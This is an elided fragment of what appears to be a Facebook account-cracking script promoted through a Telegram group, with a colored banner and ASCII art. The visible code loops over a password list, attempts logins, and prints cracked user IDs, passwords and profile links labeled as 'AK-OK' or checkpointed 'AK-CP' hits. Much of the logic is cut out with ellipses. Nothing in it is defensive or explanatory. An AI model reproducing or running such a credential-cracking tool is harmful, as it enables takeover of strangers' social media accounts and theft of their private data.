# SCRIPT BY AK 
# JOIN GROUP : https://t.me/aksaedhasan
#MORE EDIT : AK- SAED
#---------------------[ IMPORT ]---------------------#
...
\033[1;93m|         \033[1;37m|')ᡕᠵデ气亠 Ak47 ✓
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣬⣉⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀ ⠀      ⠀[Me]⣾⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀
...
def mrpoco():
    ...
    if ___option___ in ["1"]:os.system('xdg-open https://t.me/aksaedhasan');poco.append('1');______randomxmenu_______()
    elif ___option___ in ["2"]:os.system('xdg-open https://t.me/aksaedhasan');poco.append('2');______randomxmenu_______()
    elif ___option___ in ["3"]:os.system('xdg-open https://t.me/aksaedhasan');poco.append('3');______randomxmenu_______()
    elif ___option___ in ["4"]:os.system('xdg-open https://t.me/aksaedhasan');poco.append('4');______randomxmenu_______()
    elif ___option___ in ["5"]:os.system('xdg-open https://t.me/aksaedhasan');poco.append('5');______randomxmenu_______()
    elif ___option___ in ["6"]:os.system('xdg-open https://t.me/aksaedhasan');poco.append('6');______randomxmenu_______()
    ...
    for pw in pasx:
        try:
            ...
            if "checkpoint" in ewe.cookies.get_dict():
                ...
                print(f"\r{xd}-{R}[{Y}AK-CP{R}]{Y} {uid} | {pw} ")
                ...
                if 'LIVE' in response:
                    print(f"\r{xd}-{R}[{G}AK-OK{R}]{G} {uid} | {pw} ")
                    print(f"\r{G}➤{W}➤{G} FB LINK {G}━{W}➤{G} https://www.facebook.com/profile.php?id={uid}")
